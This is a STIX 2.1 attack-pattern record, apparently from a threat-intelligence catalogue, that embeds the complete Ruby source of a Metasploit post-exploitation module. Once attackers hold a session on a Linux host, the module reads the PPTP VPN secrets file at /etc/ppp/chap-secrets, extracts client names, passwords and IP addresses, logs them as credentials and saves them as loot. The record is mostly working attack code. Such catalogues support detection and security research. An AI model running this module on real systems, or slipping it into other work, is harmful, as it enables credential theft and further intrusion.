{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f4f4e0d9-7b3e-4088-9b3f-52305efed2d2",
    "created": "2024-08-14T16:33:17.303441Z",
    "modified": "2024-08-14T16:33:17.303444Z",
    "name": "Linux Gather PPTP VPN chap-secrets Credentials",
    "description": " This module collects PPTP VPN information such as client, server, password and IP from your target server's chap-secrets file.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/pptpd_chap_secrets.rb",
            "external_id": "pptpd_chap_secrets.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Gather PPTP VPN chap-secrets Credentials',\n        'Description' => %q{\n          This module collects PPTP VPN information such as client, server, password,\n          and IP from your target server's chap-secrets file.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'sinn3r'],\n        'Platform' => [ 'linux' ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILE', [true, 'The default path for chap-secrets', '/etc/ppp/chap-secrets'])\n      ]\n    )\n  end\n\n  #\n  # Reads chap_secrets\n  #\n  def load_file(fname)\n    begin\n      data = read_file(fname)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Failed to retrieve file. #{e.message}\")\n      data = ''\n    end\n    fail_with(Failure::BadConfig, \"The file #{fname} does not exist or is not a readable file!\") unless data\n    return data\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: fullname,\n      post_reference_name: refname,\n      session_id: session_db_id,\n      origin_type: :session,\n      private_data: opts[:password],\n      private_type: :password,\n      username: opts[:user]\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  #\n  # Extracts client, server, secret, and IP addresses\n  #\n  def extract_secrets(data)\n    tbl = Rex::Text::Table.new({\n      'Header' => 'PPTPd chap-secrets',\n      'Indent' => 1,\n      'Columns' => ['Client', 'Server', 'Secret', 'IP']\n    })\n\n    data.each_line do |l|\n      # If this line is commented out, ignore it\n      next if l =~ /^[[:blank:]]*#/\n\n      found = l.split\n\n      # Nothing is found, skip!\n      next if found.empty?\n\n      client = (found[0] || '').strip\n      server = (found[1] || '').strip\n      secret = (found[2] || '').strip\n      ip = (found[3, found.length] * ', ' || '').strip\n\n      report_cred(\n        ip: session.session_host,\n        port: 1723, # PPTP port\n        service_name: 'pptp',\n        user: client,\n        password: secret\n      )\n\n      tbl << [client, server, secret, ip]\n    end\n\n    if tbl.rows.empty?\n      print_status(\"This file has no secrets: #{datastore['FILE']}\")\n    else\n      print_line(tbl.to_s)\n\n      p = store_loot(\n        'linux.chapsecrets.creds',\n        'text/csv',\n        session,\n        tbl.to_csv,\n        File.basename(datastore['FILE'] + '.txt')\n      )\n      print_good(\"Secrets stored in: #{p}\")\n    end\n  end\n\n  def run\n    fname = datastore['FILE']\n    f = load_file(fname)\n    extract_secrets(f)\n  end\n\nend\n",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}